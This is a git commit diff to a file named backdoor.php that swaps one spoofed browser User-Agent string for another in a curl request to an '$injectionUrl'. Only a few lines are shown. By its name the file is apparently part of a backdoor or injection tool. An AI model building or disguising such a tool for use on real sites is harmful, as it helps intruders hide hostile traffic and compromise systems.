ae041b9218e749bb5f4d43a28e9960a3259f43ac
cazzysoci <154034397+cazzysoci@users.noreply.github.com>
2023-12-31 03:04:47 -0800

    Update backdoor.php

--- backdoor.php
+++ backdoor.php
@@ -11,7 +11,7 @@ $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $injectionUrl);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36"); 
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
 $response = curl_exec($ch);
 curl_close($ch);
 
